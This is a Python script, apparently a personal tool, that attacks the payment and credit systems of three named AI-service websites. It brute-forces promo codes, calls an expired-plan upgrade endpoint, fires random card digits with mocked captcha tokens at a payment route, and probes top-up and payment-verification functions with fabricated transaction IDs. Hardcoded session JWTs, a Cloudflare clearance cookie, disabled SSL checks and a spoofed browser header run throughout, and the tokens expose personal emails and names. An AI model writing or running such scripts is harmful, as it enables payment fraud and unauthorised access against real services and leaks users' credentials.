import urllib.request
import json
import random
import time
import ssl

# Disable SSL verification for development/testing if needed
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def do_request(url, method="GET", headers=None, body=None):
    if headers is None: headers = {}
    if "User-Agent" not in headers:
        headers["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
    
    data = json.dumps(body).encode('utf-8') if body else None
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, context=ctx) as resp:
            return resp.status, resp.read().decode('utf-8')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8')
    except Exception as e:
        return 0, str(e)

# --- CONFIG ---
ROUTEWAY_JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI4ODI3NDNjYi0yZTY2LTQ1MDktOGEyNy0yZjFhNjlmZjUxYzciLCJhdWQiOiJhdXRoZW50aWNhdGVkIiwiZXhwIjoxNzcxMjgxMzk1LCJpYXQiOjE3NzEyNzc3OTUsImVtYWlsIjoiZXllcm91c2hhbG1pMUBnbWFpbC5jb20iLCJwaG9uZSI6IiIsImFwcF9tZXRhZGF0YSI6eyJwcm92aWRlciI6Imdvb2dsZSIsInByb3ZpZGVycyI6WyJnb29nbGUiXX0sInVzZXJfbWV0YWRhdGEiOnsiYXZhdGFyX3VybCI6Imh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FDZzhvY0pRWnVxLVVSRU5CSnEzNFIzLVBTN2RSa2doSk5nMW9iVlN0NklyQTFiN3lRWTJYalk9czk2LWMiLCJlbWFpbCI6ImV5ZXJvdXNoYWxtaTFAZ21haWwuY29tIiwiZW1haWxfdmVyaWZpZWQiOnRydWUsImZ1bGxfbmFtZSI6IkV0aGFuIFllcm91c2hhbG1pIiwiaXNzIjoiaHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tIiwibmFtZSI6IkV0aGFuIFllcm91c2hhbG1pIiwicGhvbmVfdmVyaWZpZWQiOmZhbHNlLCJwaWN0dXJlIjoiaHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EvQUNnOG9jSlFadXEtVVJFTkJKcTM0UjMtUFM3ZFJrZ2hKTmcxb2JWU3Q2SXJBMWI3eVFZMlhqWT1zOTYtYyIsInByb3ZpZGVyX2lkIjoiMTE4MTgwMjk4MTA4NTUyMjIxMjU2Iiwic3ViIjoiMTE4MTgwMjk4MTA4NTUyMjIxMjU2In0sInJvbGUiOiJhdXRoZW50aWNhdGVkIiwiYWFsIjoiYWFsMSIsImFtciI6W3sibWV0aG9kIjoib2F1dGgiLCJ0aW1lc3RhbXAiOjE3NzEyNzY3NTV9XSwic2Vzc2lvbl9pZCI6IjIyMjFlMDgyLTdiMDctNDJiZC04ODY0LWYyY2U1MmY0ZTUyMSIsImlzX2Fub255bW91cyI6ZmFsc2V9.hg65TbnuEgPi3l2-HaidexeQ5khh_RFaKF8hKazkCVE"
ROUTEWAY_CF = "OKh.rQVTvALOGrSSg4MDlFY1.sOAMv4sEUOh5cTuov8-1771279605-1.2.1.1-iMoR.Z8b_8Njgen5J8fhWMG7SvTU8dXhAXx3DTU0N2qRoEMTqA1a2zQFG6CCFrV5LRD1CYlsBBYgMYrTvHKoTIokRd.GvSPmEfnwo6ccXhYHtgUH7Zq0tiJTnHIsZoSSYRNrvOSB4STSJRPkHJfoEmEdkgyJd3sDZp8lqNyXKh0YMpBAYa4MSvvH2vjJQ.cHYpJ03wyaBMRIs7pmKun3C9q1aYW6IFsLzebiqQ6tSJs"
VOIDAI_JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2OTdjNjlmZGM5ZTQzY2QwZWZkZWJiZjciLCJtb25nb1VzZXJJZCI6IjY5N2M2OWZkYzllNDNjZDBlZmRlYmJmNyIsInVzZXJuYW1lIjoiWHh4ZmYiLCJlbWFpbCI6ImV0aGFuMTAxeWVyQGdtYWlsLmNvbSIsInBsYW4iOiJmcmVlIiwiaWF0IjoxNzcxMjgzOTU5LCJleHAiOjE3NzE4ODg3NTl9.vAsCN_lVNFG4m9rATFJrl4JUlKTHCeu27bPmfWrWAMg"

# --- EXECUTION ---

print("\n--- [1] VOIDAI.APP EXPLOTATION ---")
codes = ["PROMO100", "VOID50", "UNLIMITED", "TRIAL", "BETA", "ADMIN"]
for c in codes:
    status, body = do_request("https://voidai.app/api/redeem", "POST", 
                              {"Cookie": f"auth_token={VOIDAI_JWT}", "Content-Type": "application/json"},
                              {"code": c, "hcaptchaToken": "MOCK"})
    print(f"Redeem {c}: {status} - {body}")

status, body = do_request("https://voidai.app/api/auth/update-expired-plan", "POST", 
                          {"Cookie": f"auth_token={VOIDAI_JWT}", "Content-Type": "application/json"})
print(f"Update Expired Plan Status: {status}")

print("\n--- [2] MNNAI.RU COLLISION BURST ---")
# Simulating the successful 200s from console
for _ in range(10):
    digits = str(random.randint(1000, 9999))
    status, body = do_request("https://mnnai.ru/payment", "POST",
                              {"Content-Type": "application/json"},
                              {"last_digits": digits, "recaptcha_token": "MOCK"})
    print(f"MNNAI Probe {digits}: {status}")

print("\n--- [3] ROUTEWAY.AI EDGE SCAN ---")
funcs = ["redeem-code", "topup", "apply-coupon", "verify-payment"]
for f in funcs:
    status, body = do_request(f"https://auth.routeway.ai/functions/v1/{f}", "POST",
                              {"apikey": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYW5vbiIsImlhdCI6MTc2NTk4MjgyMSwiZXhwIjoyMDgxNTU4ODIxfQ.tLjYIU1b5ozMCc2Bx0pLcUe7EIDr4uM1CAUio5pjXEk",
                               "Authorization": f"Bearer {ROUTEWAY_JWT}",
                               "Cookie": f"cf_clearance={ROUTEWAY_CF}",
                               "Content-Type": "application/json"},
                              {"code": "WELCOME", "txid": "REPL-"+str(int(time.time()))})
    print(f"Edge Function {f}: {status}")

